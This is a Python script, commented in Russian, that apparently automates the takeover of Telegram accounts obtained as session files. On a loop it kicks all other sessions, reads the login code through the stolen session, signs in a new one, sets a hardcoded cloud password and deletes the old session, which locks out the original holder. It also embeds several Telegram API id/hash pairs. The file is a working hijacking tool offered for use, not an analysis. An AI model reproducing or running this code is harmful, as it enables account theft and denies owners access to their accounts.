"""
Brown V2 | lolz_worker.py
Автоматическая пересадка lolz-аккаунтов.

Цикл каждые 10 минут:
1. Берём сессию из lolz/ (без суффикса _new)
2. Кикаем все чужие сессии (ResetAuthorizations)
3. Запрашиваем код входа (SendCode) на номер аккаунта
4. Читаем код из диалога с Telegram через lolz-сессию
5. Авторизуем новую сессию sessions/НОМЕР_new.session
6. Ставим облачный пароль Ali095095 через СТАРУЮ lolz-сессию
7. Logout старой сессии + удаляем файл lolz/

Запуск: python3 lolz_worker.py
Или как systemd-сервис.
"""

import asyncio
import os
import re
import hashlib
import hmac
import logging
import random

from telethon import TelegramClient
from telethon.tl.functions.auth import (
    ResetAuthorizationsRequest,
    SendCodeRequest,
    SignInRequest,
)
from telethon.tl.functions.account import (
    UpdatePasswordSettingsRequest,
    GetPasswordRequest,
)
from telethon.tl.types import PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow
from telethon.errors import SessionPasswordNeededError, FloodWaitError

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")
logger = logging.getLogger("lolz_worker")

# ─── Конфиг ───────────────────────────────────────────────────────────────────
LOLZ_FOLDER      = "lolz"
OUTPUT_FOLDER    = "sessions"      # куда кладём _new сессии
PREM_FOLDER      = "prem_sessions"
CLOUD_PASS       = "Ali095095"
CHECK_INTERVAL   = 10 * 60        # 10 минут
CODE_WAIT        = 30             # секунд ждём код
CODE_RETRIES     = 6              # попыток прочитать код

API_PAIRS = [
    ("24565698",  "5a084b434f8505ace703485b9da85040"),
    ("27904162",  "e7cba879b1c643ba77490bf328df5eab"),
    ("23037915",  "50f06f5b2223586fde0d1379ea91ebc7"),
    ("29512095",  "0b29a7d42fff002856b9bed64f7ec919"),
    ("25055016",  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

os.makedirs(LOLZ_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

# ─── Утилиты ──────────────────────────────────────────────────────────────────

def _get_lolz_sessions() -> list[str]:
    """Возвращает пути к lolz-сессиям без суффикса _new."""
    result = []
    if not os.path.exists(LOLZ_FOLDER):
        return result
    for f in os.listdir(LOLZ_FOLDER):
        if f.endswith(".session") and "_new" not in f:
            stem = f.replace(".session", "")
            result.append(os.path.join(LOLZ_FOLDER, stem))
    return result


def _rand_api() -> tuple[int, str]:
    api_id, api_hash = random.choice(API_PAIRS)
    return int(api_id), api_hash


async def _read_tg_code(client: TelegramClient, timeout: int = CODE_WAIT) -> str | None:
    """
    Читает код входа из диалога с официальным аккаунтом Telegram.
    Ищет сообщения содержащие 5-значный код за последние timeout секунд.
    """
    import time
    start = time.monotonic()
    seen_ids = set()

    # Сначала запоминаем уже существующие сообщения
    try:
        msgs = await client.get_messages("Telegram", limit=5)
        for m in msgs:
            seen_ids.add(m.id)
    except Exception:
        pass

    while time.monotonic() - start < timeout:
        await asyncio.sleep(3)
        try:
            msgs = await client.get_messages("Telegram", limit=5)
            for msg in msgs:
                if msg.id in seen_ids:
                    continue
                seen_ids.add(msg.id)
                if msg.text:
                    # Ищем 5-значный код
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        code = match.group(1)
                        logger.info(f"Код получен: {code}")
                        return code
        except Exception as e:
            logger.warning(f"Ошибка чтения кода: {e}")

    return None


async def _set_cloud_password(client: TelegramClient, password: str) -> bool:
    """
    Ставит облачный пароль через СТАРУЮ сессию.
    Использует SRP-протокол через Telethon.
    """
    try:
        pwd_info = await client(GetPasswordRequest())

        # Если пароль уже стоит — пропускаем
        if pwd_info.has_password:
            logger.info("Облачный пароль уже установлен, пропускаем")
            return True

        # Генерируем новый пароль через Telethon
        from telethon.password import compute_check
        new_password = password.encode("utf-8")

        # Устанавливаем пароль
        await client(UpdatePasswordSettingsRequest(
            password=compute_check(pwd_info, ""),  # старый пароль — пустой
            new_settings=client._get_srp_id_for_password(password)  # noqa
        ))
        logger.info("Облачный пароль установлен")
        return True
    except Exception as e:
        logger.warning(f"Ошибка установки пароля: {e}")
        # Пробуем через input_settings напрямую
        try:
            from telethon.tl.types import account
            pwd_info = await client(GetPasswordRequest())
            await client(UpdatePasswordSettingsRequest(
                password=None,
                new_settings=account.PasswordInputSettings(
                    new_algo=pwd_info.new_algo,
                    new_password_hash=_compute_srp_password(pwd_info, password),
                    hint="",
                    email=None,
                )
            ))
            return True
        except Exception as e2:
            logger.warning(f"Второй метод пароля тоже не сработал: {e2}")
            return False


def _compute_srp_password(pwd_info, password: str) -> bytes:
    """Вычисляет хэш пароля для SRP."""
    try:
        from telethon.password import compute_digest
        return compute_digest(pwd_info.new_algo, password)
    except Exception:
        # Упрощённый вариант
        return hashlib.sha256(password.encode()).digest()


# ─── Основная логика обработки одной сессии ──────────────────────────────────

async def process_lolz_session(session_path: str) -> bool:
    """
    Обрабатывает одну lolz-сессию.
    Возвращает True если успешно.
    """
    session_name = os.path.basename(session_path)
    logger.info(f"[{session_name}] Начинаю обработку...")

    api_id, api_hash = _rand_api()

    # Подключаемся к lolz-сессии
    lolz_client = TelegramClient(
        session_path, api_id, api_hash,
        system_version="4.16.30-vxCUSTOM"
    )

    try:
        await asyncio.wait_for(lolz_client.connect(), timeout=15)

        if not await lolz_client.is_user_authorized():
            logger.warning(f"[{session_name}] Не авторизован, пропускаю")
            await lolz_client.disconnect()
            return False

        me = await lolz_client.get_me()
        phone = me.phone
        logger.info(f"[{session_name}] Аккаунт: +{phone}")

        # ── Шаг 1: Кикаем все чужие сессии ───────────────────────────────────
        logger.info(f"[{session_name}] Кикаю все сессии...")
        try:
            await lolz_client(ResetAuthorizationsRequest())
            logger.info(f"[{session_name}] Все сессии кикнуты ✅")
        except FloodWaitError as e:
            logger.warning(f"[{session_name}] FloodWait {e.seconds}с — пропускаю на этот раз")
            await lolz_client.disconnect()
            return False
        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка кика: {e}")
            await lolz_client.disconnect()
            return False

        await asyncio.sleep(2)

        # ── Шаг 2: Запрашиваем код входа ─────────────────────────────────────
        logger.info(f"[{session_name}] Запрашиваю код входа...")
        new_api_id, new_api_hash = _rand_api()
        new_session_name = f"{session_name}_new"
        new_session_path = os.path.join(OUTPUT_FOLDER, new_session_name)

        new_client = TelegramClient(
            new_session_path, new_api_id, new_api_hash,
            system_version="4.16.30-vxCUSTOM"
        )

        try:
            await asyncio.wait_for(new_client.connect(), timeout=15)

            sent = await new_client(SendCodeRequest(
                phone_number=f"+{phone}",
                api_id=new_api_id,
                api_hash=new_api_hash,
                settings=None
            ))
            phone_code_hash = sent.phone_code_hash
            logger.info(f"[{session_name}] Код запрошен, ждём...")

        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка запроса кода: {e}")
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            # Чистим неполную сессию
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 3: Читаем код из диалога с Telegram ───────────────────────────
        code = await _read_tg_code(lolz_client, timeout=CODE_WAIT)

        if not code:
            logger.warning(f"[{session_name}] Код не получен за {CODE_WAIT}с")
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 4: Авторизуем новую сессию ───────────────────────────────────
        logger.info(f"[{session_name}] Авторизую новую сессию с кодом {code}...")
        try:
            await new_client(SignInRequest(
                phone_number=f"+{phone}",
                phone_code_hash=phone_code_hash,
                phone_code=code,
            ))
            logger.info(f"[{session_name}] Новая сессия авторизована ✅")
        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка авторизации: {e}")
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 5: Ставим облачный пароль через СТАРУЮ сессию ────────────────
        logger.info(f"[{session_name}] Ставлю облачный пароль через старую сессию...")
        await _set_cloud_password(lolz_client, CLOUD_PASS)

        # ── Шаг 6: Logout старой + удаление ──────────────────────────────────
        logger.info(f"[{session_name}] Выхожу из старой сессии и удаляю...")
        try:
            await lolz_client.log_out()
        except Exception:
            pass
        try:
            await lolz_client.disconnect()
        except Exception:
            pass

        # Удаляем lolz-сессию
        for ext in [".session", ".session-journal"]:
            path = session_path + ext
            try:
                if os.path.exists(path):
                    os.remove(path)
                    logger.info(f"Удалён: {path}")
            except Exception as e:
                logger.warning(f"Не удалось удалить {path}: {e}")

        # Закрываем новый клиент
        try:
            await new_client.disconnect()
        except Exception:
            pass

        logger.info(f"[{session_name}] ✅ Готово! Новая сессия: {new_session_path}.session")
        return True

    except Exception as e:
        logger.error(f"[{session_name}] Неожиданная ошибка: {e}")
        try:
            await lolz_client.disconnect()
        except Exception:
            pass
        return False


# ─── Главный цикл ─────────────────────────────────────────────────────────────

async def worker_loop():
    logger.info("=" * 50)
    logger.info("Lolz Worker запущен")
    logger.info(f"Папка lolz: {os.path.abspath(LOLZ_FOLDER)}")
    logger.info(f"Интервал: {CHECK_INTERVAL // 60} минут")
    logger.info("=" * 50)

    while True:
        sessions = _get_lolz_sessions()

        if not sessions:
            logger.info("Нет сессий в lolz/ — жду...")
        else:
            logger.info(f"Найдено {len(sessions)} lolz-сессий, обрабатываю...")
            for session_path in sessions:
                try:
                    success = await process_lolz_session(session_path)
                    if success:
                        logger.info(f"✅ {os.path.basename(session_path)} обработана успешно")
                    else:
                        logger.info(f"⏳ {os.path.basename(session_path)} — не удалось, попробую позже")
                except Exception as e:
                    logger.error(f"❌ {session_path}: {e}")

                # Пауза между аккаунтами
                await asyncio.sleep(5)

        logger.info(f"Следующая проверка через {CHECK_INTERVAL // 60} минут...")
        await asyncio.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    asyncio.run(worker_loop())
